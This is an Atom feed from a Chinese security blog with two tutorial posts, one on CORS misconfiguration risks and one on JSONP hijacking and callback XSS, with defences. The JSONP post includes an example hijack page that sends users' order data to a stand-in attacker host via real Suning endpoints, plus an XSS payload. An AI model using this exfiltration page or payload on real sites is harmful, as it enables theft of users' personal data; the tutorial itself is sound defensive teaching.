<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-07-26T09:15:09.422Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[前端跨域之cors安全]]></title>
        <id>https://zzggtt.github.io/post/qian-duan-kua-yu-zhi-cors-an-quan/</id>
        <link href="https://zzggtt.github.io/post/qian-duan-kua-yu-zhi-cors-an-quan/">
        </link>
        <updated>2020-07-26T09:13:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前景">前景</h2>
<p>AJAX是严格遵守浏览器的同源策略（SOP）的，既不能跨域读取数据，也不能跨域发送数据（跨站请求可以正常发起，但是返回结果会被浏览器拦截）。</p>
<p>随着Web应用的发展，Web开发者需要读取跨域网络资源内容(例如，电商网站想通过用户浏览器加载第三方快递网站的物流信息)，开发人员提出了一些临时折衷方案来满足需求，例如JSONP ，但是这些折衷方案带来了许多安全问题。</p>
<p>于是W3C 设计了 CORS 协议标准，用于替代 JSONP，实现更安全规范地支持跨域网络资源共享。从2009年开始，CORS协议就已经被各大浏览器（如 Chrome， Firefox等）支持，目前已经被主流网站广泛部署使用。</p>
<p>浏览器支持在 API 容器中（例如 <code>XMLHttpRequest</code>或 <code>Fetch</code> ）使用 CORS，以降低跨域 HTTP 请求所带来的风险。</p>
<p><strong>以百度为例：</strong><br>
<img src="https://zzggtt.github.io/post-images/1595754879551.png" alt="" loading="lazy"></p>
<h3 id="一-cors">一、CORS</h3>
<h4 id="1-cors工作流程">1、CORS工作流程</h4>
<ol>
<li>用户浏览器对资源服务器发起一个跨域请求，并在请求头中添加<code>Origin头</code>，用于声明请求方的来源。</li>
<li>资源服务器根据Origin头返回访问控制策略(<code>Access-Control-Allow-Origin</code>响应头)，并在其中声明允许读取响应内容的源。</li>
<li>浏览器检查资源服务器在<code>Access-Control-Allow-Origin</code>头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1595754886041.png" alt="" loading="lazy"></figure>
<h4 id="2-附带身份凭证的请求">2、附带身份凭证的请求</h4>
<p>一般而言，对于跨域 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 请求，浏览器<strong>不会</strong>发送<code>credentials</code>（包括<code>Cookie</code>，TLS客户端证书和代理验证信息）。如果要发送凭证信息，需要设置 <code>XMLHttpRequest</code>的某个特殊标志位。</p>
<pre><code class="language-html">var xml = new XMLHttpRequest();
xml.withCredentials = true; //发送凭证
</code></pre>
<p>如果跨域请求中带了<code>credentials</code>，那么浏览器会检查资源服务器返回的响应头中<code>Access-Control-Allow-Credentials</code>头是否设置为<code>true</code>，如果是，则允许请求方读取响应内容，否则，不允许。</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1595754891917.png" alt="" loading="lazy"></figure>
<blockquote>
<p>为了Web开发者配置方便，W3C的CORS提供了<code>Access-Control-Allow-Origin:*</code>，用于表示允许任意域访问。考虑到这种权限过于宽松，CORS又规定，<code>Access-Control-Allow-Origin:*</code>与 <code>Access-Control-Allow-Credentials:true</code>不能同时使用。浏览器会对这种误配置报错。</p>
</blockquote>
<h2 id="二-cors配置安全问题">二、CORS配置安全问题</h2>
<p>CORS协议的本质是由服务端配置的策略指导客户端浏览器，以实现跨域资源共享。但是一旦服务器端访问控制策略配置出现错误，就会出现浏览器SOP被绕过，导致用户的信息被劫持。</p>
<h4 id="1-反射origin">1、反射Origin</h4>
<p>因为CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个<code>origin</code>, <code>null</code>或<code>*</code>。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用framework来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度。</p>
<p>最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的<code>Origin</code>值。例如，下面是一个错误 Nginx 配置示例：</p>
<pre><code class="language-nginx">add_header &quot;Access-Control-Allow-Origin&quot; $http_origin;
add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot;;
</code></pre>
<h4 id="2-校验origin不严格">2、校验Origin不严格</h4>
<h4 id="3-null">3、null</h4>
<p>CORS协议复用了<code>Origin</code>头，但在CORS标准中同样缺乏对跨域请求<code>Origin</code>中<code>null</code>明确的定义和限制。有些开发者在网站上配置信任<code>null</code>，用于与本地file页面共享数据，如下所示：</p>
<pre><code class="language-http">Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials:true
</code></pre>
<p>但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过iframe sandbox构造Origin为null的跨域请求，如下是一段示意代码：</p>
<pre><code class="language-html">&lt;iframe
    sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot;
    src=&quot;data:text/html,&lt;script&gt;XMLHttpRequest here&lt;/script&gt;&quot;
&gt;
&lt;/iframe&gt;
</code></pre>
<p>这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials: true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h4 id="4-https域信任http域">4、HTTPS域信任HTTP域</h4>
<p>HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。具体流程如图所示，中间人攻击者可以可以利用<code>http://example.com</code>网站为跳板，窃取 HTTPS 网站的内容。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1595754899321.png" alt="" loading="lazy"></figure>
<h2 id="三-参考资料">三、参考资料</h2>
<blockquote>
<p>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</p>
<p>https://research.qianxin.com/archives/290</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[前端跨域之jsonp安全]]></title>
        <id>https://zzggtt.github.io/post/jsonp-an-quan/</id>
        <link href="https://zzggtt.github.io/post/jsonp-an-quan/">
        </link>
        <updated>2020-07-25T09:38:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>今天在亮神的博客看见一句话：</p>
<blockquote>
<p>在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。</p>
</blockquote>
<h3 id="一-jsonp原理">一、JSONP原理</h3>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1595666965734.png" alt="" loading="lazy"></figure>
<p><strong>参考文章</strong>：</p>
<blockquote>
<p>https://blog.csdn.net/hansexploration/article/details/80314948</p>
<p>https://www.cnblogs.com/soyxiaobi/p/9616011.html</p>
</blockquote>
<h3 id="二-jsonp安全问题">二、JSONP安全问题</h3>
<h4 id="1-跨域劫持">1、跨域劫持</h4>
<p>JSONP虽然解决了前端AJAX无法跨域的问题，但是也带来了风险：JSON Hijaking（JSON 劫持）。JSON Hijacking技术非常经典，攻击的过程是CSRF，但是是对JSONP返回的JSON数据进行劫持。</p>
<p>当目标网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP利用页面，然后诱导已登陆目标网站的用户访问恶意页面，以达到劫持用户敏感信息的目的。</p>
<p>以乌云网上报告的一个例子（wooyun-2015-0118712）来分析：</p>
<p>苏宁易购基本所有jsonp接口都没有做防护，导致第三方网站可调用苏宁的jsonp接口获取到用户敏感信息：</p>
<ul>
<li>
<p>漏洞处功能详细说明：</p>
<blockquote>
<ul>
<li>获取用户登陆状态的接口[是否登陆，会员编号] http://my.suning.com/authStatus?callback=jQuery17206592</li>
<li>获取用户个人信息的接口[加星的邮箱，用户级别，用户安全等级等] http://my.suning.com/memberInfoPageHead.do?callback=jQuery1720402</li>
<li>获取用户订单信息[下单时间，订单号，订单商品，订单金额，订单状态等] http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=jQuery1720659299</li>
<li>获取用户地址簿接口[所有姓名、住址、加星手机号] http://my.suning.com/address.do?callback=jQuery172081</li>
</ul>
</blockquote>
</li>
<li>
<p>攻击流程：</p>
<ul>
<li>
<p>攻击者构造一个劫持页面：</p>
<pre><code class="language-html">&lt;!--编写一个劫持函数：hijack --&gt;
&lt;script&gt;
    function hijack(){
        //alert(data);
        new Image().src=&quot;http://www.attacker.com/hijack.php?hi=&quot; + escape(data);//将劫持到的数据发送到攻击者服务器上
    }
&lt;/script&gt;

&lt;!--获取用户订单信息接口：使用hijack为回调函数--&gt;
&lt;script src=&quot;http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=hijack&quot;&gt;&lt;/script&gt;
</code></pre>
</li>
<li>
<p>然后攻击者欺骗已登陆目标网站（苏宁）的用户访问该页面。</p>
<blockquote>
<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
</blockquote>
</li>
<li>
<p>然后目标用户的订单信息就会被劫持发送到攻击者服务器上。</p>
</li>
</ul>
</li>
</ul>
<h4 id="2-callback可控导致的xss">2、callback可控导致的xss</h4>
<p>服务端在返回数据时，如果没有严格定义好Content-Type（Content-Type: application/json），再加上callback这个输出点没有进行过滤，而直接输出就会导致一个典型的XSS。</p>
<p>例如如下一个jsonp接口：</p>
<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=?
</code></pre>
<p>客户端除了传递<code>q=?</code>以外，还会传递一个回调函数名给服务端<code>callback=?</code>。</p>
<p>如果Content-Type（application / javascript）和callback未作过滤，直接返回。通过下面的payload就可以构造一个XSS：</p>
<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<h3 id="三-jsonp防御措施">三、JSONP防御措施</h3>
<h4 id="1-验证refere">1、验证Refere</h4>
<blockquote>
<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
</blockquote>
<h4 id="2-token">2、token</h4>
<h4 id="3-严格定义content-typeapplicationjson">3、严格定义Content-Type:application/json</h4>
<blockquote>
<p>这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码。</p>
</blockquote>
<h4 id="4-过滤callback以及json数据输出">4、过滤callback以及json数据输出</h4>
<blockquote>
<p>还可以在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。</p>
</blockquote>
<p><strong>参考文章：</strong></p>
<blockquote>
<p>https://blog.knownsec.com/2015/03/jsonp_security_technic/</p>
</blockquote>
]]></content>
    </entry>
</feed>